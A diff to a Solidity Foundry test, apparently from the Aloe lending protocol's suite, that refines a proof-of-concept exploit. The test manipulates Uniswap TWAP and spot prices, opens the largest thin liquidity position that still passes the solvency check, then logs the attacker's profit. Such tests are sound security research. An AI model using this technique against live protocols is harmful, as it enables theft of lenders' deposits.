@@ -38,10 +38,11 @@ contract ReenteringManager is IManager {
 contract AttackingManager is IManager {
     function callback(bytes calldata data, address, uint208) external override returns (uint208) {
         Borrower borrower = Borrower(payable(msg.sender));
-        borrower.UNISWAP_POOL().mint(msg.sender, 200320, 200330, abi.decode(data, (uint128)), abi.encode(borrower));
-        // console2.log(abi.decode(data, (uint128)));
 
-        return zip([int24(200320), 200330, 0, 0, 0, 0]);
+        (int24 lower, uint128 liquidity) = abi.decode(data, (int24, uint128));
+
+        borrower.UNISWAP_POOL().mint(msg.sender, lower, lower + 10, liquidity, abi.encode(borrower));
+        return zip([lower, lower + 10, 0, 0, 0, 0]);
     }
 
     function uniswapV3MintCallback(uint256 amount0, uint256, bytes calldata data) external {
@@ -552,7 +553,7 @@ contract BorrowerTest is Test, IManager, IUniswapV3SwapCallback {
         vm.selectFork(0);
 
         uint160 sqrtPrice1000 = 2.5054144838e33;
-        uint160 sqrtPrice2000 = 1.7715955711e33;
+        uint160 sqrtPrice2000 = uint160(vm.envOr("sqrtPrice", uint256(1.7715955711e33)));
 
         // Start price at $1000 per ETH
         _manipulateTWAP(300, 13000, true);
@@ -575,6 +576,7 @@ contract BorrowerTest is Test, IManager, IUniswapV3SwapCallback {
         _swapTo(sqrtPrice2000);
         _recordSwapAmounts = false;
 
+        int24 lower;
         {
             (Prices memory prices, ) = account.getPrices(1 << 32);
             (uint160 current, int24 tick, , , , , ) = pool.slot0();
@@ -585,6 +587,8 @@ contract BorrowerTest is Test, IManager, IUniswapV3SwapCallback {
             console2.log("-> sqrtPrice  TWAP:", prices.c);
             console2.log("-> sqrtPrice slot0:", current);
             console2.log("-> tick slot0:", tick);
+
+            lower = TickMath.ceil(tick, 10);
         }
 
         // Make 10M USDC available for borrowing
@@ -605,7 +609,7 @@ contract BorrowerTest is Test, IManager, IUniswapV3SwapCallback {
             for (uint256 i; i < 70; i++) {
                 L = (l + r) / 2;
 
-                bytes memory data = abi.encodeCall(account.modify, (manager, abi.encode(L), 1 << 32));
+                bytes memory data = abi.encodeCall(account.modify, (manager, abi.encode(lower, L), 1 << 32));
                 (bool success, ) = address(account).call{value: 0.01 ether}(data);
 
                 if (success) l = L;
@@ -617,17 +621,24 @@ contract BorrowerTest is Test, IManager, IUniswapV3SwapCallback {
         // Create the largest, thinnest Uniswap position possible, just below the manipulated tick
         // --> Prove that this is the maximum amount
         vm.expectRevert(bytes("Aloe: unhealthy"));
-        account.modify{value: 0.01 ether}(manager, abi.encode(L + 1), 1 << 32);
+        account.modify{value: 0.01 ether}(manager, abi.encode(lower, L + 1), 1 << 32);
         // --> Execute
-        account.modify{value: 0.01 ether}(manager, abi.encode(L + 0), 1 << 32);
+        account.modify{value: 0.01 ether}(manager, abi.encode(lower, L + 0), 1 << 32);
 
         {
             uint256 borrows0 = account.LENDER0().borrowBalance(address(account));
+            (uint256 current, , , , , , ) = pool.slot0();
+            (uint256 usdc, ) = LiquidityAmounts.getAmountsForLiquidity(
+                uint160(current),
+                TickMath.getSqrtRatioAtTick(lower),
+                TickMath.getSqrtRatioAtTick(lower + 10),
+                L
+            );
             console2.log("\nBalance Sheet:");
             console2.log("->", 100_000, "USDC upfront capital");
             console2.log("->", borrows0 / 1e6, "USDC borrowed");
-            console2.log("->", borrows0 / 1e6 + 100_000, "USDC in Uniswap position");
-            console2.log("-> Approx. leverage:", 10 + (10 * borrows0) / (100_000 * 1e6), "/ 10");
+            console2.log("->", usdc / 1e6, "USDC in Uniswap position");
+            console2.log("-> Approx. leverage:", 100 + (100 * borrows0) / (100_000 * 1e6), "/ 100");
         }
 
         // Manipulate instantaneous price to back to $1000 per ETH
@@ -652,11 +663,11 @@ contract BorrowerTest is Test, IManager, IUniswapV3SwapCallback {
 
         {
             uint256 borrows0 = account.LENDER0().borrowBalance(address(account));
-            (uint160 current, , , , , , ) = pool.slot0();
+            (uint256 current, , , , , , ) = pool.slot0();
             (, uint256 eth) = LiquidityAmounts.getAmountsForLiquidity(
-                current,
-                TickMath.getSqrtRatioAtTick(200320),
-                TickMath.getSqrtRatioAtTick(200330),
+                uint160(current),
+                TickMath.getSqrtRatioAtTick(lower),
+                TickMath.getSqrtRatioAtTick(lower + 10),
                 L
             );
             console2.log("\nBalance Sheet (still healthy!):");
@@ -664,16 +675,21 @@ contract BorrowerTest is Test, IManager, IUniswapV3SwapCallback {
             console2.log("->", borrows0 / 1e6, "USDC borrowed");
             console2.log("->", eth / 1e18, "ETH in Uniswap position");
 
+            current = ((current * current) >> 96) * 1e6;
+
             int256 swapDiff0 = -_swapAmounts[2] - _swapAmounts[0];
             int256 swapDiff1 = -_swapAmounts[3] - _swapAmounts[1];
             console2.log("\nOn their swaps, attacker gained:");
             console2.log("-> USDC:", swapDiff0 / 1e6);
             console2.log("-> WETH:", swapDiff1 / 1e18);
-            console2.log("-> (dollar value) ", swapDiff0 / 1e6 + (1000 * swapDiff1) / 1e18);
+            console2.log("-> (dollar value) ", swapDiff0 / 1e6 + (swapDiff1 * (1 << 96)) / int256(current));
             console2.log("In their Borrower, attacker gained:");
             console2.log("-> USDC:", -int256(borrows0 / 1e6 + 100_000));
             console2.log("-> WETH:", eth / 1e18);
-            console2.log("-> (dollar value) ", int256((1000 * eth) / 1e18) - int256(borrows0 / 1e6 + 100_000));
+            console2.log(
+                "-> (dollar value) ",
+                int256((eth << 96) / current) - int256(borrows0 / 1e6 + 100_000)
+            );
         }
     }
 
